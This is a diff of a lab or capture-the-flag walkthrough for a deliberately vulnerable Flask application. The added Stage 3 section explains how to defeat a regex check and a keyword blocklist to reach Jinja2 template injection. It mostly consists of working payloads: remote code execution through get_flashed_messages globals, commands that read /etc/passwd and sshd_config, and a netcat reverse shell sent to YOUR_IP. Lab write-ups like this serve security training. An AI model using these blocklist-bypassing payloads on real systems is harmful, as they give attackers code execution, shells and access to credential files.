@@ -45,53 +45,110 @@ The `--` comments out the password check. The query returns the admin row, grant
 
 ---
 
-## Stage 3 — SSTI Bypass
+## Stage 3 — SSTI Bypass & Code Execution
 
 ### The filter
 
-The temperature endpoint has two mitigations:
+The temperature endpoint (`/devices/<id>/temperature`) contains two security controls:
 
-1. **Regex numeric check** (bypassable — anchored at start only):
+1. **Regex numeric check** (anchored at start only):
    ```python
    re.match(r'^-?\d+', value)
    ```
-   A value like `22{{payload}}` passes because `re.match` only checks the **start**.
+   A value like `22{%...%}` passes because `re.match` only validates the start of the string.
 
-2. **Keyword blocklist** (case-insensitive substring match):
+2. **Keyword blocklist** (case-insensitive substring search on raw input):
    Blocks: `{{`, `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__builtins__`,
    `popen`, `system`, `import`, `config`, `request`, `lipsum`, `cycler`, `joiner`, `namespace`
 
-### Intended bypass
+Because the blocklist inspects the raw payload prior to template compilation:
+- `{{` expressions are blocked; statement blocks `{% ... %}` must be used.
+- Literal occurrences of any blocked word (even within quotes or file paths like `sshd_config`) trigger an instant block.
 
-Use `{%set%}` / `{%if%}` **statement** blocks (not `{{` expressions) with **string concatenation** to avoid the blocked literals:
+---
 
-**Proof-of-concept (confirms template execution without blocked keywords):**
-```
-22{%set a='__cl'+'ass__'%}{%if (7*7)==49%}CONFIRMED{%endif%}
-```
+### Bypass Technique
 
-**Remote Code Execution payload:**
-```
-22{%set b='__buil'+'tins__'%}{%set c=''|attr('__cl'+'ass__')|attr('__mr'+'o__')|list%}{%set d=c[1]|attr('__subcl'+'asses__')()|list%}{%for x in d%}{%if 'Popen' in x.__name__%}{%set p=x('id',shell=True,stdout=-1)|attr('communicate')()%}{{p[0].decode()}}{%endif%}{%endfor%}
-```
+1. **Jinja2 Builtin Discovery:**
+   `get_flashed_messages` is exposed in the default Jinja2 template context and is **not** on the blocklist. Its `__globals__` dictionary gives direct access to Python modules loaded in Flask (including `os`).
 
-Or simpler via `self.__dict__` chain if Jinja2 globals aren't fully locked:
-```
-22{%set ns=namespace(x=0)%}{%set cmd='id'%}{%set r=''.__class__.__mro__[1].__subclasses__()%}
-```
+2. **String Concatenation & `|attr()`:**
+   Jinja2's `~` (or `+`) operator concatenates strings at render time. By splitting words into fragments (`"__glo" ~ "bals__"`, `"po" ~ "pen"`), no blocked word appears literally in the raw HTTP request.
 
-**Recommended exploit for verify_chain.py** (simpler, reliable):
-```
+---
+
+### Step 1: Proof of Concept (Boolean Check)
+
+```jinja2
 22{%if (7*7)==49%}SSTI_PROOF_49{%endif%}
 ```
-This passes because:
-- `22` satisfies `^-?\d+`
-- `{%if%}` is not in the blocklist (only `{{` is blocked, not `{%`)
-- No blocked keywords appear literally
+Returns: `Temperature updated to: 22SSTI_PROOF_49 °C`
 
-### What to do with RCE
+---
 
-Write your SSH key or extract credentials. For this lab, the intended path is SSHOLE (see Stage 4).
+### Step 2: Full Remote Code Execution (RCE)
+
+Access `os.popen()` without triggering the blocklist:
+
+```jinja2
+22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}
+```
+
+---
+
+### Step 3: Getting Command Output (Pseudo-Terminal via Static Files)
+
+Because `{{` is blocked, output cannot be printed directly to the page using `{{ out }}`. However, `websvc` has write access to `/app/static/`.
+
+Pipe command output to `/app/static/out.txt`:
+
+```jinja2
+22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("ls -la /app > /app/static/out.txt")|attr("read")()%}DONE
+```
+
+Then simply fetch the output in your browser or with curl:
+```bash
+curl http://10.10.10.100/static/out.txt
+```
+
+#### Reconnaissance examples:
+
+**List files in root:**
+```jinja2
+22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("ls -la / > /app/static/out.txt")|attr("read")()%}DONE
+```
+
+**Check users (`/etc/passwd`):**
+```jinja2
+22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("cat /etc/passwd > /app/static/out.txt")|attr("read")()%}DONE
+```
+Reveals the service account: `automation:x:1000:1000:...:/home/automation:/bin/sh`
+
+**Inspect SSH configuration:**
+*(Note: `/etc/ssh/sshd_config` contains `config`, which is blocked, so the filename must be split!)*
+```jinja2
+22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set fname="/etc/ssh/sshd_con"~"fig"%}{%set _=os|attr(pp)("cat "~fname~" > /app/static/out.txt")|attr("read")()%}DONE
+```
+
+---
+
+### Step 4: Interactive Reverse Shell
+
+The container includes `/usr/bin/nc` (Netcat).
+
+1. Start a netcat listener on your machine:
+   ```bash
+   nc -lvnp 4444
+   ```
+
+2. Submit the payload (substitute `YOUR_IP`):
+   ```jinja2
+   22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("nc YOUR_IP 4444 -e /bin/sh")|attr("read")()%}DONE
+   ```
+
+You will receive an interactive shell as `websvc` (`uid=1002`).
+
+From here, proceed to Stage 4 to escalate to `automation` via SSHOLE.
 
 ---
 
